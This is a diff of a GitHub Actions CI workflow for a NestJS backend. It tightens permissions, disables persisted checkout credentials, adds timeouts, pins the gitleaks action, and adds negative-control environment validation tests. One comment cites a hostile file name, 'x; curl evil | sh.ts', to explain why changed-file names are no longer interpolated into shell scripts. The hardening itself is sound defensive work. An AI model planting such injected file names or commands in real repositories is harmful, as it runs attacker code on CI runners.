@@ -1,22 +1,32 @@
 name: CI
 
+# `push` is limited to the long-lived branches: every other branch is covered by its pull request,
+# and running both for the same commit doubled every job (push + pull_request) without adding signal.
 on:
   push:
-    branches: ['**']
+    branches: [main, develop]
   pull_request:
 
-# Cancel superseded runs on the same ref to save CI minutes.
+# Least privilege: no job here writes to the repository, issues or packages.
+permissions:
+  contents: read
+
+# Cancel superseded runs of the same ref (a newer push to a PR/feature ref makes the older run
+# worthless). Never cancel a run on main/develop: each commit there must keep its own verdict.
 concurrency:
-  group: ci-${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: true
+  group: ci-${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
+  cancel-in-progress: ${{ github.ref != 'refs/heads/main' && github.ref != 'refs/heads/develop' }}
 
 jobs:
   build-test:
     name: Typecheck, lint, build & test
     runs-on: ubuntu-latest
+    timeout-minutes: 30
     steps:
       - name: Checkout
         uses: actions/checkout@v4
+        with:
+          persist-credentials: false
 
       - name: Setup Node.js
         uses: actions/setup-node@v4
@@ -27,13 +37,12 @@ jobs:
       - name: Install dependencies
         run: npm ci
 
-      - name: Typecheck
-        run: npx tsc --noEmit -p tsconfig.build.json
-
       - name: Lint
         run: npx eslint .
 
-      - name: Build
+      # `npm run build` = `tsc --noEmit -p tsconfig.build.json && nest build --builder swc`, so the
+      # typecheck is performed here (a separate `tsc` step ran the identical check twice, ~1 min).
+      - name: Typecheck & build
         run: npm run build
 
       - name: Unit tests (with coverage)
@@ -46,10 +55,12 @@ jobs:
           name: backend-coverage
           path: coverage/
           if-no-files-found: ignore
+          retention-days: 7
 
   migration-chain:
     name: Migration chain (empty database)
     runs-on: ubuntu-latest
+    timeout-minutes: 20
     # Proves the ENTIRE migration history applies cleanly to a genuinely empty
     # PostgreSQL database. The regular unit/E2E suites materialise their schema
     # with TYPEORM_SYNCHRONIZE=true (see the `e2e` job below), which builds
@@ -79,6 +90,8 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v4
+        with:
+          persist-credentials: false
 
       - name: Setup Node.js
         uses: actions/setup-node@v4
@@ -95,6 +108,9 @@ jobs:
   e2e:
     name: E2E tests (Postgres + Redis)
     runs-on: ubuntu-latest
+    # 95 serial suites at ~50 s each locally; bounded so a hang (see TYPEORM_SYNCHRONIZE below) can no
+    # longer burn the 6 h default.
+    timeout-minutes: 120
     services:
       postgres:
         image: postgres:16
@@ -115,8 +131,12 @@ jobs:
     env:
       NODE_ENV: test
       DATABASE_URL: postgres://postgres:postgres@localhost:5432/lms_test
-      # Test DB schema is materialised from entities (allowed outside production).
-      TYPEORM_SYNCHRONIZE: 'true'
+      # The schema is built ONCE by test/global-setup-e2e.ts (entity synchronize, allowed outside
+      # production). The suites themselves must boot with synchronize OFF: with 'true' every suite
+      # re-synchronizes, TypeORM's enum-alteration path fails on scheduled_lesson_sessions
+      # ("..._enum = ..._enum_old"), the connection retries forever and the job hangs with no output
+      # (reproduced locally against postgres:16; root cause documented in global-setup-e2e.ts).
+      TYPEORM_SYNCHRONIZE: 'false'
       REDIS_HOST: localhost
       REDIS_PORT: '6379'
       JWT_SECRET: test-jwt-secret-value-at-least-32-chars-long
@@ -129,6 +149,8 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v4
+        with:
+          persist-credentials: false
 
       - name: Setup Node.js
         uses: actions/setup-node@v4
@@ -147,20 +169,26 @@ jobs:
   secret-scan:
     name: Secret scanning (gitleaks)
     runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: read
+      pull-requests: read
     steps:
       - name: Checkout
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
+          persist-credentials: false
 
       - name: Run gitleaks
-        uses: gitleaks/gitleaks-action@v2
+        uses: gitleaks/gitleaks-action@ff98106e4c7b2bc287b24eaf42907196329070c7 # v2
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
 
   format-check:
     name: Prettier (changed files only)
     runs-on: ubuntu-latest
+    timeout-minutes: 10
     # `npm run lint` includes `prettier --check .` on the WHOLE repo, which
     # would fail CI on ~315 files that predate this check
     # (STAGING_ENVIRONMENT_IMPLEMENTATION_PLAN.md §12.2 step 3's own warning
@@ -173,6 +201,7 @@ jobs:
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
+          persist-credentials: false
 
       - name: Setup Node.js
         uses: actions/setup-node@v4
@@ -183,27 +212,34 @@ jobs:
       - name: Install dependencies
         run: npm ci
 
+      # Event SHAs come from the `github` context (hex only). File names are NEVER interpolated into the
+      # script: a PR can add a file called `x; curl evil | sh.ts`, so the list is NUL-delimited on disk
+      # and handed to prettier through xargs -0.
       - name: Determine changed files
         id: changed
+        env:
+          BASE_SHA: ${{ github.event.pull_request.base.sha || github.event.before }}
+          HEAD_SHA: ${{ github.sha }}
         run: |
-          BASE="${{ github.event.pull_request.base.sha || github.event.before }}"
-          if [ -z "$BASE" ] || ! git cat-file -e "$BASE" 2>/dev/null; then
+          BASE="$BASE_SHA"
+          if [ -z "$BASE" ] || ! git cat-file -e "$BASE^{commit}" 2>/dev/null; then
             BASE=$(git rev-parse HEAD~1 2>/dev/null || echo "")
           fi
           if [ -z "$BASE" ]; then
-            echo "files=" >> "$GITHUB_OUTPUT"
+            echo "count=0" >> "$GITHUB_OUTPUT"
             exit 0
           fi
-          FILES=$(git diff --name-only --diff-filter=ACMR "$BASE" "${{ github.sha }}" -- '*.ts' '*.tsx' '*.js' '*.jsx' '*.json' '*.md' | tr '\n' ' ')
-          echo "files=$FILES" >> "$GITHUB_OUTPUT"
+          git diff -z --name-only --diff-filter=ACMR "$BASE" "$HEAD_SHA" -- '*.ts' '*.tsx' '*.js' '*.jsx' '*.json' '*.md' > "$RUNNER_TEMP/changed-files.z"
+          if [ -s "$RUNNER_TEMP/changed-files.z" ]; then echo "count=1" >> "$GITHUB_OUTPUT"; else echo "count=0" >> "$GITHUB_OUTPUT"; fi
 
       - name: Prettier --check on changed files
-        if: steps.changed.outputs.files != ''
-        run: npx prettier --check ${{ steps.changed.outputs.files }}
+        if: steps.changed.outputs.count != '0'
+        run: xargs -0 -a "$RUNNER_TEMP/changed-files.z" npx prettier --check --ignore-unknown
 
   env-validation:
     name: Environment validation (staging shape)
     runs-on: ubuntu-latest
+    timeout-minutes: 10
     # Calls the exact validate() NestJS's ConfigModule calls at boot
     # (src/config/env.validation.ts) against a synthetic, staging-shaped
     # configuration, so a schema regression (a newly-required variable, a
@@ -231,6 +267,8 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v4
+        with:
+          persist-credentials: false
 
       - name: Setup Node.js
         uses: actions/setup-node@v4
@@ -244,9 +282,33 @@ jobs:
       - name: Validate synthetic staging configuration
         run: npx ts-node -r tsconfig-paths/register scripts/validate-env.ts
 
+      # Negative controls: a validator that can never fail proves nothing. Each case starts from the
+      # SAME valid staging config above and breaks exactly one rule that must stay enforced; the step
+      # fails if validation still passes, or fails for a different reason than the expected rule.
+      # Only synthetic values are used and no rule is relaxed anywhere.
+      - name: Validation must still reject unsafe staging configurations
+        run: |
+          expect_rejection() {
+            local expected="$1"; shift
+            local out
+            if out=$(env "$@" npx ts-node -r tsconfig-paths/register scripts/validate-env.ts 2>&1); then
+              echo "::error::validation unexpectedly PASSED for: $expected"; exit 1
+            fi
+            if ! printf '%s' "$out" | grep -q "$expected"; then
+              echo "::error::validation failed, but not with the expected rule: $expected"; exit 1
+            fi
+            echo "ok: rejected with $expected"
+          }
+          expect_rejection STAGING_PRODUCTION_DATABASE_HOST \
+            DATABASE_URL=postgres://u:p@learnix.school:5432/staging_placeholder
+          expect_rejection STAGING_DATABASE_NAME_NOT_MARKED \
+            DATABASE_URL=postgres://u:p@localhost:5432/not_marked
+          expect_rejection "JWT_SECRET must be longer" JWT_SECRET=too-short
+
   migration-safety-check:
     name: Migration safety check
     runs-on: ubuntu-latest
+    timeout-minutes: 10
     # Classifies every migration file changed relative to `origin/main` as
     # SAFE / NEEDS_DB_APPROVAL / BLOCKED (scripts/migration-safety-check.ts).
     # Non-blocking today (continue-on-error): rolling this out as a hard PR
@@ -261,6 +323,7 @@ jobs:
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
+          persist-credentials: false
 
       - name: Setup Node.js
         uses: actions/setup-node@v4
@@ -277,6 +340,7 @@ jobs:
   dependency-audit:
     name: Dependency audit (npm audit)
     runs-on: ubuntu-latest
+    timeout-minutes: 10
     # Non-blocking today: the current baseline is 3 high + 42 moderate
     # advisories, all transitive through firebase-admin's Google Cloud
     # dependency chain (verified 2026-08-06, not this project's own direct
@@ -287,6 +351,8 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v4
+        with:
+          persist-credentials: false
 
       - name: Setup Node.js
         uses: actions/setup-node@v4
